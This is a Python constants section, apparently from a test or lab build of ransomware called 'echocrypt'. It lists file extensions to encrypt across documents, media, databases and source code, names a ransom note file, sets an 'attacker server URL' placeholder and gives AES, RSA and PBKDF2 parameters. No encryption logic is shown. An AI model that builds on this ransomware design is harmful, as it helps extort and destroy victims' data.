from cryptography.hazmat.primitives.ciphers import algorithms

# --- Constants section Start ---
TARGET_FILE_EXTENSIONS = [
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.odt', '.ods', '.odp', '.rtf', '.csv', '.md', '.json', '.xml',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.tif', '.svg',
    '.heic', '.webp',
    '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm',
    '.mp3', '.wav', '.flac', '.aac', '.ogg', '.m4a',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz',
    '.sqlite', '.db', '.sql', '.log', '.dat',
    '.py', '.java', '.c', '.cpp', '.h', '.html', '.css', '.js', '.php',
    '.rb', '.go', '.sh', '.bat', '.ps1'
]
ENCRYPTED_FILE_EXTENSION = '.echocrypt' # file extension
RANSOM_NOTE_FILENAME = 'README.txt'
ENCRYPTION_METADATA_FILENAME = 'encrypted_metadata.json'
SERVER_URL = 'http://127.0.0.1:3000/password' # Input attacker server URL
RETRY_DELAY_SECONDS = 60
AES_KEY_SIZE = 32 
RSA_KEY_SIZE = 2048
DIRECTORY = 'test_files' # Do not use absolute paths like '/' or 'C:/'.

# Constants for password-based key derivation
PBKDF2_SALT_SIZE = 16
PBKDF2_ITERATIONS = 100000
AES_BLOCK_SIZE = algorithms.AES.block_size // 8 # AES block size (in bytes)
# --- Constants section End ---